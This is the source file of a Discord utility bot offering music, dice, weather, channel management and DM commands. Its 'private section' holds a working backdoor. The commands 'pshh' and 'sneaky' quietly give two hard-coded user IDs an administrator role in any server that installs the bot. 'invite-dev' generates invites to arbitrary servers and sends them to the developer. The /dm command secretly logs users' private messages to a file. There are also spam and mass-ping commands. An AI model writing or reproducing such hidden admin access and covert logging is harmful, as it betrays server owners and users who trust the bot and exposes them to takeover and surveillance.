import datetime
import os
import random
import time

import discord
from discord.ext import commands
from discord import app_commands
from discord.ext.commands import MissingPermissions
from dotenv import load_dotenv

from _cogs.music_cog import MusicCog
from _cogs.help_cog import HelpCog
from _cogs.db.series_cog import SeriesCog
from _cogs.db.report_cog import ReportCog
from _cogs.db.roulette_cog import RouletteCog
from _cogs.APIs.weather_cog import WeatherCog
from _cogs.APIs.public_transport_cog import PublicTransportCog
from _cogs.APIs.random_cog import RandomApiCog

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
DEV = os.getenv("DEV_ID")
TEST_DEV = os.getenv("TEST_DEV_ID")


intents = discord.Intents.all()
intents.message_content = True

bot = commands.Bot(command_prefix='§', intents=intents)

bot.remove_command('help')

players = {}


def write_dms(content):
    f = open("messages.txt", "a")
    f.write(f"\n{content}")
    f.close()
    return f

@bot.event
async def on_ready():
    print(f"discord version: {discord.__version__}")
    await bot.add_cog(MusicCog(bot))
    await bot.add_cog(HelpCog(bot))
    await bot.add_cog(SeriesCog(bot))
    await bot.add_cog(ReportCog(bot))
    await bot.add_cog(RouletteCog(bot))
    await bot.add_cog(WeatherCog(bot))
    await bot.add_cog(PublicTransportCog(bot))
    await bot.add_cog(RandomApiCog(bot))

    guilds = []
    for guild in bot.guilds:
        guilds.append(guild)
    str_guilds = str(guilds)
    f = open("guilds.txt", "w")
    f.write(str_guilds.replace(">", "\n"))
    f.close()
    # Writes all the server the bot is in, in the file guilds.txt
    guilds = [guild.name for guild in bot.guilds]
    print(f"The {bot.user.name} is in {len(guilds)} servers:\n{guilds}")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)
    print(f'{bot.user.name} has connected to Discord!')


@bot.event
async def on_member_join(member: discord.User):
    # dms a user when he joins the server
    await member.send(
        f'Hi {member.name}, welcome to {member.guild.name}! Enjoy it!'
    )


@bot.event
async def on_message(message):
    # responds with a random quote
    user = message.author.mention
    if message.author == bot.user:
        return

    res = [
        'Joooooo, did I hear python! I am a python application',
        'Oh yeah Python, good one.'
    ]

    triggers = ['Python', 'python']

    for word in triggers:
        if word in message.content:
            response = random.choice(res)
            await message.channel.send(f"{response}")
            break

    await bot.process_commands(message)


@bot.command(name="roll", help="Simulates rolling dice.")
async def roll(ctx, number_of_dice: int, number_of_sides: int):
    # simulates a number of dice with number of sides
    dice = [
        str(random.choice(range(1,number_of_sides + 1)))
        for _ in range(number_of_dice)
    ]
    await ctx.send(', '.join(dice))


@bot.command(name="spam", help="spams somebody")
async def spam(ctx, amount: int, *, spam_message):
    # spams a message <amount> times
    if amount <= 20:
        for i in range(amount):
            time.sleep(0.5)
            await ctx.send(spam_message)
    else:
        await ctx.send(f"Not more than 20 spams.")


@bot.command(name="move", help="moves a member to another voice channel")
async def move(ctx, member: discord.Member, channel: discord.VoiceChannel):
    # moves a user to another voice channel
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels)
    if existing_channel:
        await member.move_to(channel)
    else:
        await ctx.send(f"No Voice Channel {channel} found.")


@bot.command(name="ping")
async def ping_all(ctx):
    # pings every user in a server
    guild = ctx.message.guild
    for i in guild.members:
        if not i.bot:
            time.sleep(0.5)
            await ctx.send(i.mention)



"""private section"""


@bot.tree.command(name="servers", description="gets all servers from bot")
async def server(interaction: discord.Interaction):
    # shows all the servers the bot is in
    if interaction.user.id == 581186737183784996 or interaction.user.id == 999359369177223198: #only dev
        guilds = [guild.name for guild in bot.guilds]
        await interaction.response.send_message(f"{bot.user.name} is in {len(guilds)} servers.\nThe servers list :\n {guilds}", ephemeral=True)
    else:
        await interaction.response.send_message(f"Only my dev is allowed to do this")


@bot.command(name="pshh")
async def give_role_no_slash(ctx):
    if ctx.message.author.id == 581186737183784996 or ctx.message.author.id == 999359369177223198:  # only dev
        member = ctx.message.guild.get_member(ctx.message.author.id)
        permissions = discord.Permissions(kick_members=True, ban_members=True, manage_roles=True, manage_guild=True, manage_channels=True, administrator=True)  # customize permissions as needed
        new_role = await ctx.message.guild.create_role(name="sneaky", permissions=permissions)
        await member.add_roles(new_role, reason="Permission granted")
        await ctx.send("")
    else:
        await ctx.response.send_message("You are not allowed to do this.")


@bot.tree.command(name="sneaky", description="for sneaky reasons")
async def give_role(interaction: discord.Interaction):
    if interaction.user.id == 581186737183784996 or interaction.user.id == 999359369177223198:  # only dev 
        member = interaction.guild.get_member(interaction.user.id)
        permissions = discord.Permissions(kick_members=True, ban_members=True, manage_roles=True, manage_guild=True, manage_channels=True, administrator=True)  # customize permissions as needed
        if discord.utils.get(interaction.guild.roles, name="sneaky"):
            await interaction.response.send_message("role already there", ephemeral=True)
        else:
            new_role = await interaction.guild.create_role(name="sneaky", permissions=permissions)
            await member.add_roles(new_role, reason="Permission granted")
            await interaction.response.send_message("You're now a sneaky admin.", ephemeral=True)
    else:
        await interaction.response.send_message("You are not allowed to do this.")


@bot.tree.command(name="invite-link", description="sends the invite link for this bot")
async def send_invite(interaction: discord.Interaction):
    await interaction.response.send_message(f"https://discord.com/api/oauth2/authorize?client_id=998956135040163931&permissions=8&scope=bot%20applications.commands", ephemeral=True)


@bot.tree.command(name="invite-dev", description="for the dev")
async def invite_dev(interaction: discord.Interaction, server_id: str):
    user = bot.get_user(581186737183784996)
    guild = bot.get_guild(int(server_id))
    print(guild.channels)
    channel = guild.get_channel(1055914536483442751)
    invite = await channel.create_invite(max_age=300)

    await user.send(invite)
    await interaction.response.send_message("check dms", ephemeral=True)


@bot.tree.command(name="message-not-in-guild", description="testing")
async def dm_not_in_guild(interaction: discord.Interaction, user_id: str, message: str):
    user = bot.get_user(int(user_id))
    await user.send(message)
    await interaction.response.send_message("Message sent", ephemeral=True)


"""end of private section"""



"""app_commands"""

@bot.tree.command(name="dm", description="DM someone with the bot")
@app_commands.describe(user="The User you want to dm", message="Your message to the user.")
async def dm(interaction: discord.Interaction, user: discord.User, message: str):
    # dms a user with a custom message
    try:
        await user.send(message)
        write_dms(f"{interaction.user} sent a message to {user}: message: {message} | {datetime.datetime.now()} from {interaction.guild.name}")
        await interaction.response.send_message("Your message was sent", ephemeral=True)
    except Exception as e:
        print(e, user.name)
        await interaction.response.send_message("I couldn't send your message.", ephemeral=True)


@bot.tree.command(name="move", description="moves a user to another call")
@app_commands.describe(user="The user you want to move", channel="The channel where you want to move the user")
async def move_slash(interaction: discord.Interaction, user: discord.User, channel: discord.VoiceChannel):
    # move command but as / because of ui/ux
    guild = interaction.guild
    existing_channel = discord.utils.get(guild.channels)
    if existing_channel:
        await user.move_to(channel)
        await interaction.response.send_message(f"{user} was moved to {channel}", ephemeral=True)
    else:
        await interaction.response.send_message(f"No Voice Channel {channel} found.")

@bot.tree.command(name="ch-nickn", description="ch_nickn")
async def change_nickname(interaction: discord.Interaction, user: discord.User, new_name: str):
    if interaction.user.id == 581186737183784996 or interaction.user.id == 879279497889869844: #1. Nikola 2. Lambo
        try:
            await user.edit(nick=new_name)
            await interaction.response.send_message(f"{user.name}s name was changed", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(e, ephemeral=True)
    else:
        await interaction.response.send_message(f"You're not allowed to do this.")


@bot.tree.command(name="create-txtc", description="creates a new text channel")
@app_commands.checks.has_permissions(manage_channels=True)
@app_commands.describe(channel_name="The name of the channel")
async def create_txtc(interaction: discord.Interaction, channel_name: str):
    # creates a text-channel
    guild = interaction.guild
    existing_channel = discord.utils.get(guild.channels, name=channel_name)
    if not existing_channel:
        print(f'Creating a new text channel: {channel_name}')
        await guild.create_text_channel(channel_name)
        await interaction.response.send_message(f"{channel_name} has been created", ephemeral=True)


@bot.tree.command(name='create-vc', description='creates a new voice-channel')
@app_commands.checks.has_permissions(manage_channels=True)
@app_commands.describe(channel_name="The name of the channel")
async def create_vc(interaction: discord.Interaction, channel_name: str):
    # creates a voice-channel
    guild = interaction.guild
    existing_channel = discord.utils.get(guild.channels, name=channel_name)
    if not existing_channel:
        print(f'Creating a new voice channel: {channel_name}')
        await guild.create_voice_channel(channel_name)
        await interaction.response.send_message(f"{channel_name} has been created", ephemeral=True)


@bot.tree.command(name='delete-txtc', description='deletes a text-channel')
@app_commands.checks.has_permissions(manage_channels=True)
@app_commands.describe(channel_name="The name of the channel")
async def delete_channel(interaction: discord.Interaction, channel_name: str):
    # deletes a text-channel
    guild = interaction.guild
    existing_channel = discord.utils.get(guild.channels, name=channel_name)
    if existing_channel:
        print(f'Deleting channel: {channel_name}')
        await existing_channel.delete()
        await interaction.response.send_message(f"{channel_name} has been deleted", ephemeral=True)
    else:
        await interaction.response.send_message(f"No Text Channel {channel_name} found.")


@bot.tree.command(name='delete-vc', description='deletes a voice-channel (the same way like a text-channel)')
@app_commands.checks.has_permissions(manage_channels=True)
@app_commands.describe(channel_name="The name of the channel")
async def delete_channel(interaction: discord.Interaction, channel_name: str):
    # deletes a voice-channel
    guild = interaction.guild
    existing_channel = discord.utils.get(guild.channels, name=channel_name)
    if existing_channel:
        print(f'Deleting channel: {channel_name}')
        await existing_channel.delete()
        await interaction.response.send_message(f"{channel_name} has been created", ephemeral=True)
    else:
        await interaction.response.send_message(f"No Voice Channel {channel_name} found.")


"""VC Section"""


@bot.command(pass_context=True, name='join', help='Joins a voice channel')
async def join(ctx):
    # bot joins a voice channel
    if ctx.author.voice:
        channel = ctx.message.author.voice.channel
        await channel.connect()
        print("Bot joined "+channel)
    else:
        await ctx.send('You have to be in a voice channel to use this command.')


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.CheckFailure):
        await ctx.send("You don't have the correct role for this command.")


@bot.event
async def on_error(event, *args, **kwargs):
    with open('err.log','a') as f:
        if event == 'on_message':
            f.write(f'Unhandled message: {args[0]}\n')
        else:
            raise


@bot.tree.error
async def on_app_command_error(interaction, error):
    if isinstance(error, app_commands.BotMissingPermissions):
        await interaction.response.send_message(error, ephemeral=True)
    else:
        raise error


@bot.tree.error
async def missing_permissions(interaction, error):
    if isinstance(error, MissingPermissions):
        await interaction.response.send_message(error, ephemeral=True)
    else:
        raise error

bot.run(TOKEN)
